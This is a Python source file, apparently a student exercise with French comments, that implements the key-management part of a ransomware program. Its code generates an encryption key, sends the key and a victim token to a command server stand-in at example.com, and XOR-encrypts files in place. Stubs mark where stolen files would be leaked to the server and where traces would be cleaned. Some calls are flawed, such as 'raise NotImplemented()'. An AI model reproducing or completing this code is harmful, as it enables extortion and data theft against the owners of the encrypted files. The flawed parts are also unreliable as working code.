from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64
import json

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:

        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=self.TOKEN_LENGTH, salt=salt, iterations=self.ITERATION)#On hache le sel en SHA256 (sur 16 bits)
        dk = kdf.derive(key)#on dérive le hachage avec la clé qui est elle aussi random
        return dk

    def create(self)->Tuple[bytes, bytes, bytes]:
         #On génère un sel et une clé aléatoires
        self._salt = os.urandom(self.SALT_LENGTH)
        key = os.urandom(self.KEY_LENGTH)
        # On crée une clé dérivée de la précédente et du sel en utilisant le PBKDF2HMAC
        self._key = self.do_derivation(self._salt, key)
        # On génère le token aléatoire
        self._token = os.urandom(self.TOKEN_LENGTH)
        return self._salt, self._key, self._token

    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        salt_b64 = base64.b64encode(salt).decode()
        key_b64 = base64.b64encode(key).decode()
        token_b64 = base64.b64encode(token).decode()
        data = {"token": token_b64, "salt": salt_b64, "key": key_b64}
        json_data = json.dumps(data)
        #on met les données crypto en base 64 pour être sur qu'elles seront bien transmises sans être erronées.
        response = requests.post("http://example.com/new", json=json_data)
        #on envoie une requête POST à un serveur distant
        if response.status_code != 200:
            raise Exception("Failed to send data to server")
        #on vérifie si la requête a bien été envoyée.
       
    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        salt, key, token = self.create()
        with open(os.path.join(self._path, 'salt.bin'), 'wb') as salt_file:
            salt_file.write(salt)
        with open(os.path.join(self._path, 'key.bin'), 'wb') as key_file:
            key_file.write(key)
        self.post_new(salt, key, token)

    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        hash_object = sha256(self._token)
        hex_dig = hash_object.hexdigest()
        return hex_dig
    
    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for file in files:
            with open(file, "rb") as f:
                plaintext = f.read()
            ciphertext = bytes([plaintext[i] ^ self._key[i % len(self._key)] for i in range(len(plaintext))])
            with open(file, "wb") as f:
                f.write(ciphertext)

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()